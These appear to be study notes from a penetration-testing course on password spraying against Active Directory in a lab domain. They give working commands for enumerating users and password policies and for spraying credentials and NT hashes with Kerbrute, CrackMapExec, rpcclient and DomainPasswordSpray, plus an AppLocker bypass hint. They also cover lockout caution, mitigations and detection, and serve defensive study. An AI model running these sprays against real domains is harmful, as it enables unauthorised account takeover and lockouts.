We've now captured hashes for several accounts. At this point in our assessment, we would want to perform enumeration using a tool such as BloodHound to determine whether any or all of these hashes are worth cracking. If we get lucky and crack a hash for a user account with some privileged access or rights, we can begin expanding our reach into the domain. We may even get very lucky and crack the hash for a Domain Admin user! If we were unlucky in cracking hashes or cracked some but did not yield any fruit, then perhaps password spraying (which we will cover in-depth in the following few sections) will be more successful

# Password Spraying Overview
Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.

## Story Time
Password spraying can be a very effective way to gain a foothold internally. There are many times that this technique has helped me land a foothold during my assessments. Keep in mind that these examples come from non-evasive "grey box" assessments where I had internal network access with a Linux VM and a list of in-scope IP ranges and nothing else.
### Scenario 1
In this first example, I performed all my standard checks and could not find anything useful like an SMB NULL session or LDAP anonymous bind that could allow me to retrieve a list of valid users. So I decided to use the Kerbrute tool to build a target username list by enumerating valid domain users (a technique we will cover later in this section). To create this list, I took the jsmith.txt username list from the statistically-likely-usernames GitHub repo and combined this with results that I got from scraping LinkedIn. With this combined list in hand, I enumerated valid users with Kerbrute and then used the same tool to password spray with the common password Welcome1. I got two hits with this password for very low privileged users, but this gave me enough access within the domain to run BloodHound and eventually identify attack paths that led to domain compromise.
### Scenario 2
In the second assessment, I was faced with a similar setup, but enumerating valid domain users with common username lists, and results from LinkedIn did not yield any results. I turned to Google and searched for PDFs published by the organization. My search generated many results, and I confirmed in the document properties of 4 of them that the internal username structure was in the format of F9L8, randomly generated GUIDs using just capital letters and numbers (A-Z and 0-9). This information was published with the document in the Author field and shows the importance of scrubbing document metadata before posting anything online. From here, a short Bash script could be used to generate 16,079,616 possible username combinations.
```bash
#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```
I then used the generated username list with Kerbrute to enumerate every single user account in the domain. This attempt to make it more difficult to enumerate usernames ended up with me being able to enumerate every single account in the domain because of the predictable GUID in use combined with the PDF metadata I could locate and greatly facilitated the attack. Typically, I can only identify 40-60% of valid accounts using a list such as jsmith.txt. In this example, I significantly increased my chances of a successful password spraying attack by starting the attack with ALL domain accounts in my target list. From here, I obtained valid passwords for a few accounts. Eventually, I was able to follow a complicated attack chain involving Resource-Based Constrained Delegation ([RBCD](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a) and the [Shadow Credentials](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition) attack to ultimately gain control over the domain.
## Password Spraying Considerations
While password spraying is useful for a penetration tester or red teamer, _careless use may cause considerable harm_, such as locking out hundreds of production accounts. One example is brute-forcing attempts to identify the password for an account using a long list of passwords. In contrast, password spraying is a more measured attack, utilizing very common passwords across multiple industries. The below table visualizes a password spray.
### Password Spray Visualization
```txt
Attack 	Username 	Password
1 	bob.smith@inlanefreight.local 	Welcome1
1 	john.doe@inlanefreight.local 	Welcome1
1 	jane.doe@inlanefreight.local 	Welcome1
DELAY 		
2 	bob.smith@inlanefreight.local 	Passw0rd
2 	john.doe@inlanefreight.local 	Passw0rd
2 	jane.doe@inlanefreight.local 	Passw0rd
DELAY 		
3 	bob.smith@inlanefreight.local 	Winter2022
3 	john.doe@inlanefreight.local 	Winter2022
3 	jane.doe@inlanefreight.local 	Winter2022
```
It involves sending fewer login requests per username and is less likely to lock out accounts than a brute force attack. However, password spraying still presents a risk of lockouts, so _it is essential to introduce a delay between login attempts_. Internal password spraying can be used to move laterally within a network, and the same considerations regarding account lockouts apply. However, it may be possible to obtain the domain password policy with internal access, significantly lowering this risk.

It’s common to find a password policy that allows five bad attempts before locking out the account, with a 30-minute auto-unlock threshold. Some organizations configure more extended account lockout thresholds, even requiring an administrator to unlock the accounts manually. If you don’t know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset. It is best to obtain the password policy before attempting the attack during an internal assessment, but this is not always possible. We can err on the side of caution and either choose to do just one targeted password spraying attempt using a weak/common password as a "hail mary" if all other options for a foothold or furthering access have been exhausted. Depending on the type of assessment, we can always ask the client to clarify the password policy. If we already have a foothold or were provided a user account as part of testing, we can enumerate the password policy in various ways. Let's practice this in the next section.
## Enumerating & Retrieving Password Policies
### Enumerating the Password Policy - from Linux - Credentialed
As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.
```bash
m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
### Enumerating the Password Policy - from Linux - SMB NULL Sessions
Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.
_When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration_. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as enum4linux, CrackMapExec, rpcclient, etc.
#### Using rpcclient 
We can use rpcclient to check a Domain Controller for SMB NULL session access. Once connected, we can issue an RPC command such as querydominfo to obtain information about the domain and confirm NULL session access.
```bash
m1l0js@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
```
#### Using enum4linux
Let's try this using enum4linux. enum4linux is a tool built around the Samba suite of tools nmblookup, net, rpcclient and smbclient to use for enumeration of windows hosts and domains. It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. Below we have an example output displaying information that can be provided by enum4linux. Here are some common enumeration tools and the ports they use:
Tool |  		Ports
-- | -- 
nmblookup |  	137/UDP
nbtstat |  	137/UDP
net |  		139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
rpcclient |  	135/TCP
smbclient |  	445/TCP
```bash
m1l0js@htb[/htb]$ enum4linux -P 172.16.5.5
```
#### Using enum4linux-ng
The tool enum4linux-ng is a rewrite of enum4linux in Python, but has _additional features such as the ability to export data as YAML or JSON files_ which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features
```bash
m1l0js@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. _This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests_. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.
With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapseach.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. 
#### Using ldapsearch
With ldapsearch, it can be a bit cumbersome but doable. One example command to get the password policy is as follows:
```bash
m1l0js@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### Enumerating Null Session - from Windows
It is less common to do this type of null session attack from Windows, but we could use the command `net use \\host\ipc$ "" /u:""` to establish a null session from a windows machine and confirm if we can perform more of this type of attack.
```cmd
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.
```
We can also use a username/password combination to attempt to connect. Let's see some _common errors when trying to authenticate_:
#### Error: Account is Disabled
```cmd
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.
This user can't sign in because this account is currently disabled.
```
#### Error: Password is Incorrect
```cmd
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.
The user name or password is incorrect.
```
#### Error: Account is locked out (Password Policy)
```cmd
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.
The referenced account is currently locked out and may not be logged on to.
```
### Enumerating the Password Policy - from Windows - Authenticated
If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.
Using built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it. 
#### Using net.exe
One example using the built-in net.exe binary is:
```cmd
C:\htb> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```
Here we can glean the following information:
+ Passwords never expire (Maximum password age set to Unlimited)
+ The minimum password length is 8 so weak passwords are likely in use
+ The lockout threshold is 5 wrong passwords
+ Accounts remained locked out for 30 minutes
This password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as Welcome1. The lockout threshold of 5 means that we can attempt 2-3 (to be safe) sprays every 31 minutes without the risk of locking out any accounts. If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but _we should avoid locking out ANY accounts at all costs_.
#### Using powershell
```powershell
PS C:\> Get-ADDefaultDomainPasswordPolicy
PS C:\> get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto //To see badpwcount
```
#### Using PowerView
PowerView is also quite handy for this:
```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```
PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).
## Analyzing the Password Policy
As with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, whether it is our attack system or a system provided by the client. PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, and other potential restrictions on the target host. Let's cover a few examples.

We've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.
- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (Password1 or Welcome1 would satisfy the "complexity" requirement here, but are still clearly weak passwords).
* The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
## Next Steps
Now that we have the password policy in hand, we need to create a target user list to perform our password spraying attack. Remember that sometimes we will not be able to obtain the password policy if we are performing external password spraying (or if we are on an internal assessment and cannot retrieve the policy using any of the methods shown here). In these cases, we MUST exercise extreme caution not to lock out accounts. We can always ask our client for their password policy if the goal is as comprehensive an assessment as possible. If asking for the policy does not fit the expectations of the assessment or the client does not want to provide it, we should run one, max two, password spraying attempts (regardless of whether we are internal or external) and wait over an hour between attempts if we indeed decide to attempt two. While most organizations will have a lockout threshold of 5 bad password attempts, a lockout duration of 30 minutes and accounts will automatically unlock, we cannot always count on this being normal. I have seen plenty of organizations with a lockout threshold of 3, requiring an admin to intervene and unlock accounts manually. Let's now prepare to launch our password spraying attacks by gathering a list of target users.
## Password Spraying - Making a Target User List
### Detailed User Enumeration
To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:
- By leveraging an _SMB NULL session_ to retrieve a complete list of domain users from the domain controller
- Utilizing an _LDAP anonymous bind_ to query LDAP anonymously and pull down the domain user list
- Using a tool such as _Kerbrute_ to validate users utilizing a word list from a source such as the stastically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- _Using a set of credentials_ from a Linux or Windows attack system _either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist_
No matter the method we choose, it is also vital for us to consider the domain password policy. If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts. Knowing the account lockout threshold and bad password timer will tell us how many spray attempts we can do at a time without locking out any accounts and how many minutes we should wait between spray attempts.
Again, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a "hail mary" if all other options for a foothold have been exhausted. We could also try one spray every few hours in an attempt to not lock out any accounts. Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:
- The accounts targeted
- Domain Controller used in the attack
- Time of the spray
- Date of the spray
- Password(s) attempted
This will help us ensure that we do not duplicate efforts. If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.
####  SMB NULL Session to Pull User List
If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.
It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.
Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. 
##### Using enum4linux
We can do this with enum4linux with the `-U` flag.
```bash
m1l0js@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
m1l0js@htb[/htb]$ cat users.txt | awk '{print $1}' | grep -Po '\[\K[^]]*' 
```
##### Using rpcclient
We can use the enumdomusers command after connecting anonymously using rpcclient.
```bash
m1l0js@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```
##### Using CrackMapExec --users Flag
Finally, we can use CrackMapExec with the `--users` flag. This is a useful tool that _will also show the badpwdcount_ (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the _baddpwdtime_, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset. _In an environment with multiple Domain Controllers, this value is maintained separately on each one_. To get an accurate total of the account's bad password attempts, _we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role_.
```bash
m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
```
#### Gathering Users with LDAP Anonymous
We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include windapsearch and ldapsearch. 
##### Using ldapsearch
If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.
```bash
m1l0js@htb[/htb]$ ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
##### Using windapsearch
Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.
```bash
m1l0js@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
#### Enumerating Users with Kerbrute
As mentioned in the Initial Enumeration of The Domain section, if we have no access at all from our position in the internal network, we can use Kerbrute to enumerate valid AD accounts and for password spraying.
This tool uses _Kerberos Pre-Authentication_, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. _The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid_. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.
Let's try out this method using the jsmith.txt wordlist of 48,705 possible common usernames in the format flast. The statistically-likely-usernames GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using Kerbrute.
```bash
m1l0js@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. _Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy_. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.
If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.
####  Credentialed Enumeration to Build our User List
With valid credentials, we can use any of the tools stated previously to build a user list. 
##### Using CrackMapExec with Valid Credentials
A quick and easy way is using CrackMapExec.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
## Internal Password Spraying - from Linux
Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.
Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. 
### Execute the attack
#### Using rpcclient
Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from here) can be used to perform the attack.
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
#### Using Kerbrute for the Attack
We can also use Kerbrute for the same attack as discussed previously.
```bash
m1l0js@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
There are multiple other methods for performing password spraying from Linux. 
#### Using CrackMapExec & Filtering Logon Failures
Another great option is using CrackMapExec. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for + to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
### Validate the credentials
After getting one (or more!) hits with our password spraying attack, we can then use CrackMapExec to validate the credentials quickly against a Domain Controller.
#### With CrackMapExec
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
### Local Administrator Password Reuse
Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. _Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts_.
CrackMapExec is a handy tool for attempting this attack. _It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers_, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers. Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
#### Local Admin Spraying with CrackMapExec
Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
This technique, while effective, _is quite noisy and is not a good choice for any assessments that require stealth_. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. _One way to remediate this issue is using the free Microsoft tool Local Administrator Password Solution_ ([LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.
## Internal Password Spraying - from Windows
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. We may run into a situation where the client wants us to perform testing from a managed Windows device in their network that we can load tools onto. We may be physically on-site in their offices and wish to test from a Windows VM, or we may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.
There are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.
### Using DomainPasswordSpray.ps1
```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
## Mitigations
Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.
Technique |  	Description
-- | -- 
Multi-factor Authentication |  	Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.
Restricting Access | 	It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.
Reducing Impact of Successful Exploitation 	| A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.
Password Hygiene |  	Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.
Other Considerations |  It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.

## Detection
Some indicators of external password spraying attacks include:
* Many account lockouts in a short period
* Server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.
* In the Domain Controller’s security log, _many instances of event ID 4625: An account failed to log on_ over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. _Organizations should also monitor event ID 4771: Kerberos pre-authentication failed_, which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
```powershell
PS C:\> get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto
```
With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.
## External Password Spraying
While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:
+ Microsoft 0365
+ Outlook Web Exchange
+ Exchange Web Access
+ Skype for Business
+ Lync Server
+ Microsoft Remote Desktop Services (RDS) Portals
+ Citrix portals using AD authentication
+ VDI implementations using AD authentication such as VMware Horizon
+ VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
+ Custom web applications that use AD authentication
## Moving Deeper
Now that we have several sets of valid credentials, we can begin digging deeper into the domain by performing credentialed enumeration with various tools. We will walk through several tools that complement each other to give us the most complete and accurate picture of a domain environment. With this information, we will seek to move laterally and vertically in the domain to eventually reach the end goal of our assessment.
# Enumerating Security Controls
After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools. Some organizations have more stringent protections than others, and some do not apply security controls equally throughout. There may be policies applied to certain machines that can make our enumeration more difficult that are not applied on other machines.

`Note`: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.
## Windows Defender
Windows Defender (or Microsoft Defender after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as PowerView. There are ways to bypass these protections. These ways will be covered in other modules. We can use the built-in PowerShell cmdlet `Get-MpComputerStatus` to get the current Defender status. Here, we can see that the RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
```powershell
PS C:\htb> Get-MpComputerStatus
```
## AppLocker
An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the AppLocker rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:
```powershell
%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
```
So, we can merely call it from other locations. Sometimes, we run into more stringent AppLocker policies that require more creativity to bypass. These ways will be covered in other modules.
```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
## PowerShell Constrained Language Mode
PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```
## LAPS
